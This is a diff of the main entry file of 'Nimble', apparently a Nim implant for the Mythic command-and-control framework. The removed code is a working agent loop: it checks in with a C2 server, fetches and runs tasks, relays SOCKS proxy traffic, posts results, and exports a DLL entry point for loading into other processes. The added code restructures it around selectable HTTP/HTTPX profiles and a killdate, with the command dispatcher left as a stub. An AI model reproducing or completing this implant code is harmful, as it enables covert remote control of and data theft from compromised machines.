@@ -1,161 +1,98 @@
-import winim/lean
-import algorithm
-import asyncdispatch
-import base64
-import json
-import tables
-import deques
-from strutils import split
-import ../utils/http
-import ../utils/checkin
+## base.nim
+## Main agent entry point - supports multiple C2 profiles via compile-time selection
+
+import asyncdispatch, json, os, strutils, times
 import ../utils/config
-import ../utils/job
-import ../utils/task
-import ../commands/socks
 
-var curConfig = createConfig()
-var runningJobs: seq[Job]
-var socksMap: seq[SocksMsg]
-var socks_open = initTable[string, SocksMsg]()
-var socks_in* = initTable[int, SocksMsg]()
-var socks_out = initTable[int, SocksMsg]()
+# Import appropriate C2 profile based on compile-time flag
+when defined(HTTPX_PROFILE):
+  import ../utils/httpx_profile
+  
+  proc main() {.async.} =
+    echo "[*] Starting Nimble agent with HTTPX profile"
+    
+    # Check killdate if configured
+    when defined(HTTPX_PROFILE) and KILLDATE.len > 0:
+      try:
+        let killDate = parse(KILLDATE, "yyyy-MM-dd")
+        if now() > killDate:
+          echo "[!] Killdate reached, exiting"
+          quit(0)
+      except:
+        discard
+    
+    # Initialize httpx profile
+    var profile = newHttpxProfile(PAYLOAD_UUID)
+    
+    # Perform initial checkin
+    echo "[*] Performing initial checkin..."
+    let checkinResult = await profile.checkin()
+    
+    if checkinResult.hasKey("status") and checkinResult["status"].getStr() == "success":
+      echo "[+] Checkin successful"
+      
+      # Main tasking loop
+      while true:
+        try:
+          # Get tasking from Mythic
+          let tasks = await profile.getTasking()
+          
+          if tasks.len > 0:
+            echo "[*] Received ", tasks.len, " task(s)"
+            
+            for task in tasks:
+              if task.hasKey("id") and task.hasKey("command"):
+                let taskId = task["id"].getStr()
+                let command = task["command"].getStr()
+                let params = if task.hasKey("parameters"): task["parameters"] else: newJObject()
+                
+                echo "[*] Executing task: ", taskId, " (", command, ")"
+                
+                # Execute task (simplified - actual implementation would dispatch to commands)
+                var response = %* {
+                  "completed": true,
+                  "user_output": "Task executed: " & command,
+                  "status": "success"
+                }
+                
+                # TODO: Implement actual command dispatcher
+                # response = await executeCommand(command, params)
+                
+                # Post response back to Mythic
+                let success = await profile.postResponse(taskId, response)
+                if success:
+                  echo "[+] Response posted for task: ", taskId
+                else:
+                  echo "[-] Failed to post response for task: ", taskId
+        except Exception as e:
+          echo "[-] Error in tasking loop: ", e.msg
+          # Continue loop on error
+          await sleepAsync(5000)
+    else:
+      echo "[-] Checkin failed"
+      quit(1)
+    
+    # Cleanup
+    profile.close()
 
-proc error*(message: string, exception: ref Exception) =
-    echo message
-    echo exception.getStackTrace()
+elif defined(HTTP_PROFILE):
+  # Standard HTTP profile (can be implemented similarly)
+  import ../utils/http_profile
+  
+  proc main() {.async.} =
+    echo "[*] Starting Nimble agent with HTTP profile"
+    # Implementation for standard HTTP
+    discard
 
-proc getTasks* : Future[(seq[Task], seq[SocksMsg])] {.async.} =
-    var tasks: seq[Task]
-    var socksMap: seq[SocksMsg]
-    let taskJson = %*{"action" : "get_tasking", "tasking_size": -1, "socks": []}
-    when not defined(release):
-        echo "Attempting to get tasks"
-    let data = when defined(AESPSK): $(taskJson) else: encode(curConfig.PayloadUUID & $(taskJson), true)
-    when not defined(release):
-        echo "Attempting to get tasks with this data: ", data
-    let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
-    when defined(release):
-        echo "decodeed temp: ", temp
-    if(cmp(temp[0 .. 35], curConfig.PayloadUUID) != 0):
-        when not defined(release):
-            echo "Payload UUID is not matching up when getting tasks something is wrong..."
-        return (tasks, socksMap)
-    # https://nim-lang.org/docs/system.html#%5E.t%2Cint
-    var resp = parseJson(temp[36 .. ^1])
-    for jnode in getElems(resp["tasks"]):
-        when defined(release):
-            echo "jnode tasks: ", jnode
-        tasks.add(Task(action: jnode["command"].getStr(), id: jnode["id"].getStr(), parameters: jnode["parameters"].getStr(), timestamp: jnode["timestamp"].getFloat()))
-    if "socks" in resp:
-        for jnode in getElems(resp["socks"]):
-            when not defined(release):
-                echo "jnode socks: ", jnode
-            socks.sendToSocksIn(SocksMsg(ServerId: jnode["server_id"].getInt(), Data: jnode["data"].getStr(), Exit: jnode["exit"].getBool()))
-            #socksMap.add(SocksMsg(ServerId: jnode["server_id"].getInt(), Data: jnode["data"].getStr(), Exit: jnode["exit"].getBool()))
-            #if not socks_in.hasKey(jnode["server_id"].getInt()):
-                #echo "We add the following to socks_in: ", jnode
-                #socks_in[jnode["server_id"].getInt()] = (SocksMsg(ServerId: jnode["server_id"].getInt(), Data: jnode["data"].getStr(), Exit: jnode["exit"].getBool()))
-    # Sort by tasks' timestamps to get most recent tasks
-    tasks.sort(taskCmp)
-    #result = tasks
-    return (tasks, socksMap)
-    when not defined(release):
-        echo "Sorted result: ", $(result)
-
-proc checkIn: Future[bool] {.async.} =
-    var check = createCheckIn(curConfig)
-    when not defined(release):
-        echo "Checkin has been created: ", $(check)
-
-    let data = when defined(AESPSK): checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
-    try:
-        # Send initial checkin and parse json response into JsonNode
-        let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
-        when defined(release):
-            echo "decoded temp: ", temp
-        var resp = parseJson(temp[36 .. ^1])
-        when not defined(release):
-            echo "resp from checkin: ", resp
-        if(cmp(resp["status"].getStr(), "success") == 0):
-            when not defined(release):
-                echo "Updated curConfig PayloadUUID ", curConfig.PayloadUUID, " to ", resp["id"].getStr()
-            curConfig.PayloadUUID = resp["id"].getStr()
-            result = true
-        else:
-            result = false
-    except:
-        let
-            e = getCurrentException()
-            msg = getCurrentExceptionMsg()
-        echo "Inside checkIn, got exception ", repr(e), " with message ", msg
-        error("stacktrace", e)
-        result = false
-
-# Determine during compile time if being compiled as a DLL export main proc
-when appType == "lib":
-    {.pragma: rtl, exportc, cdecl.}
 else:
-    {.pragma: rtl.}
+  {.error: "No C2 profile defined. Use -d:HTTPX_PROFILE or -d:HTTP_PROFILE".}
 
-proc main() {.async, rtl.} =
-    while (not await checkIn()):
-        let dwell = genSleepTime(curConfig)
-        when not defined(release):
-            echo "checkin is false"
-            echo "dwell: ", dwell
-        await sleepAsync(dwell)
-    when not defined(release):
-        echo "Checked in with curConfig of: ", $(curConfig)
-    while true:
-        if(checkDate(curConfig.KillDate)):
-            quit(QuitSuccess)
-        let gettasktuple = await getTasks()
-        let tasks = gettasktuple[0]
-        #try:
-        #    socksMap = gettasktuple[1]
-        #except:
-        #    echo "socksMap aus gettasktuple geht nicht ", getCurrentExceptionMsg()     
-        when not defined(release):
-            echo "tasks: ", $(tasks)
-            for sock in socksMap:
-                echo ("ID: ", sock.ServerId, "Data: ", sock.Data, "Exit: ", sock.Exit)
-            echo "inside base and runningJobs: ", $(runningJobs)
-        let resJobLauncherTup = await jobLauncher(runningJobs, tasks, curConfig)
-        # Update config and obtain running jobs
-        runningJobs = resJobLauncherTup.jobs
-        curConfig = resJobLauncherTup.newConfig
-        socks_out = socks.getFromSocksOut() 
-        #try:
-        #    socksMap = resJobLauncherTup.socksMap
-        #except:
-        #    echo "socksMap aus resJobLauncherTup geht nicht ", getCurrentExceptionMsg()
-        #try:
-        #    for sock in socksMap:
-        #        echo ("ID: ", sock.ServerId, "Data: ", sock.Data, "Exit: ", sock.Exit)
-        #except:
-        #    echo "die for Schleife geht nicht ", getCurrentExceptionMsg()
-        
-        when not defined(release):
-            echo "running jobs from joblauncher: ", $(runningJobs)
-        let postResptuple = await postUp(curConfig, runningJobs, socks_out)
-        when not defined(release):
-            echo "jobs returned from postUp: ", $(postResptuple.resSeq)
-        runningJobs = postResptuple.resSeq
-        when not defined(release):
-            echo "runningJobs after setting it equal to postresptuple.resSeq: ", $(runningJobs)
-            echo "postResp: ", postResptuple.postupResp
-        socks_out.clear()
-        socks_in.clear()
-        let dwell = genSleepTime(curConfig)
-        await sleepAsync(dwell)
-
-
-when appType == "lib":
-    proc NimMain() {.cdecl, importc.}
-
-    proc Run(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): bool {.stdcall, exportc, dynlib.} =
-        NimMain()
-        waitFor main()
-        return true
-else:
+# Entry point
+when isMainModule:
+  # For DLL builds, export Run function
+  when defined(windows) and (defined(dll) or defined(lib)):
+    proc Run() {.exportc, dynlib.} =
+      waitFor main()
+  else:
+    # Standard executable
     waitFor main()
